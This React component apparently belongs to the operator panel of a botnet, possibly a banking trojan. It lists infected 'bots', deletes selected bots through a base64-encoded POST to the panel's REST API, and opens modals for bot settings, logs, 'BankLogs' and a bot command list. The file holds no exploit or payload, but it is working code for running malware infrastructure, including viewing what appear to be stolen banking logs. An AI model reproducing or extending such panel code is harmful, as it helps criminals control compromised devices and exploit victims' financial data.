import React from 'react';
import BotsTable from '../Controls/BotsTable/BotsTable';
import SettingsContext from '../Settings';
import BotSettingsModal from '../Controls/Modals/BotSettingsModal';
import CommandsList from '../Controls/Commands/CommandsList';
import $ from 'jquery';
import { isNullOrUndefined } from 'util';
import BotInfoModal from '../Controls/Modals/BotInfoModal';
import BotSortModal from '../Controls/Modals/BotSortModal';
import { try_eval } from '../serviceF';
import LogsModal from '../Controls/Modals/LogsModal';
import BankLogsModal from '../Controls/Modals/BankLogsModal';

class BotsList extends React.Component {
    constructor(props) {
        super(props)
        this.BotListForceUpdate = this.BotListForceUpdate.bind(this)
    }

    BotListForceUpdate() {
        this.forceUpdate();
    }

    deleteSelectedBots() { // TODO: Callback to refresh table after fetch
        let botsList = '';
        SettingsContext.SelectedBots.forEach(function(element) {
            botsList += element + ',';
        }); // преобразование в нужный формат массива ботов

        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.restApiUrl,
            data: {
                'params': new Buffer('{"request":"deleteBots","idbot":"' + botsList.substring(0, botsList.length - 1) + '"}').toString('base64')
            }
        });
        
        request.done(function(msg) {
			try {
				let result = JSON.parse(msg);
				if(!isNullOrUndefined(result.error))
				{
					SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
				}
				else
				{
					SettingsContext.ShowToast('success', result.message);
					SettingsContext.CurrentSetBot = '';
					SettingsContext.UpdateTable();
					this.forceUpdate();
				}
            }
            catch (ErrMgs) {
                SettingsContext.ShowToastTitle('error', 'ERROR', 'Error deleteBots command. Look console for more details.');
                console.log('Error - ' + ErrMgs);
            }
        }.bind(this));
    }

    clearSelection() {
        SettingsContext.SelectedBots = [];
        this.forceUpdate();
    }

    FilterModal() {
        try_eval('$("#BotSortTableModal").modal("show");');
    }

    SelectAllBots() {
        SettingsContext.SelectedBots = SettingsContext.BotsOnPage;
        this.forceUpdate();
    }

    render () {
        return (
            <div>
                <h1 class="pageHeader disable-select">Main BOTS table</h1>
                <table style={({width:'100%',marginBottom:'10px'})}>
                        <tr>
                            <td>
                                <button type="button" onClick={this.deleteSelectedBots.bind(this)} class="btn btn-outline-danger">Delete selected bots</button>
                            </td>
                            <td>
                                <button type="button" onClick={this.FilterModal.bind(this)} class="btn btn-outline-info btnTableBots">Filter table</button>
                            </td>
                            <td>
                                <button type="button" onClick={this.clearSelection.bind(this)} class="btn btn-outline-primary btnTableBots">Clear selection</button>
                                <button type="button" onClick={this.SelectAllBots.bind(this)} class="btn btn-outline-primary btnTableBots" style={({marginRight:'15px'})}>Select All on this page</button>
                            </td>
                        </tr>
                </table>
                <BotsTable BotListForceUpdate={this.BotListForceUpdate} updateHash={SettingsContext.UpdateTableHash}/>
                <BotSettingsModal BotListForceUpdate={this.BotListForceUpdate} updateHash={SettingsContext.CurrentSetBot} />
                <BotInfoModal BotListForceUpdate={this.BotListForceUpdate} updateHash={SettingsContext.CurrentSetBot} />
                <LogsModal BotListForceUpdate={this.BotListForceUpdate} updateHash={SettingsContext.CurrentLogType} />
                <BankLogsModal BotListForceUpdate={this.BotListForceUpdate} updateHash={SettingsContext.CurrentLogType} />
                <BotSortModal BotListForceUpdate={this.BotListForceUpdate} updateHash={SettingsContext.CurrentSetBot} />
                <CommandsList />
            </div>
        );
    }
}

export default BotsList;